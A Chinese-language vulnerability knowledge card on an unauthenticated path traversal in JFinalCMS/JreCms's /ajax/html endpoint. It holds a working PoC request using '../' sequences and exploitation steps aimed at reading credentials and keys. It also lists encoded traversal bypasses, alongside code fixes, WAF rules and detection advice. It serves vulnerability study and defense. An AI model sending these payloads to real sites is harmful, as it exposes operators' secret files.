---
id: web-generic-file-inclusion-jfinalcms-ajax-html-render-traversal
title: JFinalCMS /ajax/html 的 html 参数目录穿越：render 模板路径拼接导致未授权任意文件读取
type: scenario
domain: web
path: web/generic/file-inclusion
technique: jfinalcms-ajax-html-render-path-traversal
tags:
- web
- java
- jfinalcms
- jrecms
- cms
- arbitrary-file-read
- path-traversal
- render
- code-audit
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-11'
updated: '2026-11-11'
verification:
  verified_by: verifier-V553
  verified_at: '2026-11-11T23:00:12+08:00'
  notes: 已对照原文与 12 张截图核对：图 12 AjaxController.html() 的 render("/templates/"+getCurrentTemplate()+"/"+html) 与卡片一致；图 11 实测 GET /ajax/html?html=../../.../1.txt 返回 200 与 1.txt 内容(123123)；前台未授权定性依据原文“前台任意文件读取”章节。dedup 候选为同产品 fileKey/FileManager/database delete 等不同 sink，无同链。未验证点：getCurrentTemplate 默认主题名未在截图展示。
url: /docs/web/generic/file-inclusion/web-generic-file-inclusion-jfinalcms-ajax-html-render-traversal/
draft: false
kb_aliases:
- /ajax/html 任意文件读取
- jfinalcms html 参数穿越
- AjaxController.html render 穿越
- JreCms 前台文件读取
- templates 路径拼接 render
---

## 一句话结论

JFinalCMS/JreCms 的 `AjaxController.html()` 把请求参数 `html` 直接拼进 `render("/templates/" + getCurrentTemplate() + "/" + html)`，既不做 `../` 过滤也不做路径规范化；未登录请求 `GET /ajax/html?html=../../../../../../1.txt` 就能让模板渲染器越出模板目录、把任意文件内容当模板渲染并回显。

## 原理

- **拼接式视图路径**：`public void html() { keepPara(); String html = getPara("html"); render("/templates/" + getCurrentTemplate() + "/" + html); }`，`html` 完全由请求控制，`getCurrentTemplate()` 是当前站点/主题名，二者以字符串拼接成视图路径。
- **render 的路径解析**：JFinal 的 `render(view)` 把视图名交给模板引擎（Enjoy）从视图根目录解析；路径中允许 `../`，解析后落到模板目录之外的真实文件，引擎按模板语法读取并渲染该文件内容。
- **为什么能回显**：响应是 `text/html`，模板内容被原样输出到响应体——原文 PoC 读 `1.txt` 返回 `123123`，证明文件内容被当模板渲染后回显。
- **未授权**：PoC 请求只带匿名 `JSESSIONID`/`_jfinal_captcha` 等 Cookie，没有后台登录态即可访问 `/ajax` 路由；`keepPara()` 只保留参数用于视图，不影响穿越。
- **与下载接口的区别**：`/common/down/file?fileKey=` 是 `new File(webRoot+fileKey)` 读流，本接口是**模板渲染路径穿越**，属于另一处独立 sink，修复要分别做路径规范化。

## 触发条件

- 目标为存在 `AjaxController`（`@RequestMapping(url="/ajax")`，方法 `html`）的 jfinalcms/JreCms 版本；不同版本路由/方法名可能略有差异。
- `/ajax` 路由未要求登录（或攻击者已有任意低权限会话）。
- 目标文件对应用进程可读；请求路径能通过服务器的 URI 规范化（`../` 未被前置 WAF/容器拦截）。
- 模板目录存在且 `getCurrentTemplate()` 返回非空值（默认主题即可）。

## 利用步骤

1. 确认路由：访问 `/ajax/html?html=index.html`，返回正常模板内容说明 sink 存在。
2. 构造穿越深度：从 `/templates/<主题>/` 逐级 `../` 上跳到 Web 根及更上层，读取目标文件（如 `../../../../../../1.txt`、配置文件、源码）。
3. 发送 `GET /ajax/html?html=../../../../../../1.txt`，响应体即文件内容（被模板引擎渲染；含模板语法的文件可能被解析，纯文本原样回显）。
4. 根据回显内容进一步读取数据库口令、密钥、日志，或结合其它漏洞扩大影响。

## PoC

原文实测请求/响应（目标 Jetty 9.4.12）：

```http
GET /ajax/html?html=../../../../../../../../../../../../../1.txt HTTP/1.1
Host: 127.0.0.1:8888
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Cookie: JSESSIONID=node015ngvb2ja0qa1wkafhnodmyx50.node0; _jfinal_captcha=f9a9d1bdbbe14e6fb43902e9fb6daec9; listQuery=directory%3Ddefault
```

响应 `HTTP/1.1 200 OK`，`Content-Type: text/html;charset=utf-8`，正文为 `1.txt` 内容（示例 `123123`）。

## 变体与关联

- **同产品其它遍历 sink**：`/common/down/file?fileKey=` 把 `fileKey` 拼到 Web 根后用 `renderFile(new File(...))` 读文件（库内已有独立卡）；后台模板编辑/保存/删除另有 `directory`/`fileName` 拼接穿越（见模板管理穿越卡）。三者根因相同（拼接路径不做规范化），端点与修复点不同。
- **跨产品同类**：其它 Java CMS 的模板详情/模板渲染接口（`render`/`readFileToString`/`new File` 拼接）都可用相同思路；只要参数进入视图解析且允许 `..` 即可。
- **绕过变体**：`..%2f`、双写 `....//`、`..\`（Windows）、绝对路径（若拼接后仍可解析）取决于容器/框架规范化行为；本案例直接 `../` 即可。
- **联动**：读到的模板文件可用于后续 SSTI 分析；若配合后台模板编辑写入恶意模板，则从文件读取升级为 RCE。

## 检测与防御

- **代码修复**：对 `html` 做白名单（只允许 `[A-Za-z0-9_-]+\.html`），或 `Path` 规范化后校验 `startsWith(templateRoot)`；不要依赖前端/容器拦截。
- **运行侧**：WAF 拦截参数中的 `../`、`..%2f`、`%2e%2e`；监控 `/ajax/html` 返回体中出现非模板文件特征（如配置、源码、flag 格式）。
- **检测**：访问日志中 `/ajax/html` 的 `html` 参数含穿越序列、响应长度与模板页明显不符；同一会话连续读取不同深度的路径。
- **加固**：该 CMS 长期未更新，建议下线或限制 `/ajax` 路由到必要模板名；升级到修复版本（若存在）。

## 备注

- 原文提交 CNVD 并通过；PoC 请求与 200 回显在原文截图中完整可见。
- 截图界面标题为 JreCms（jfinalcms 衍生/换皮版本），路由与代码结构与 jfinalcms 一致；本卡按原文标题归入 jfinalcms 体系。
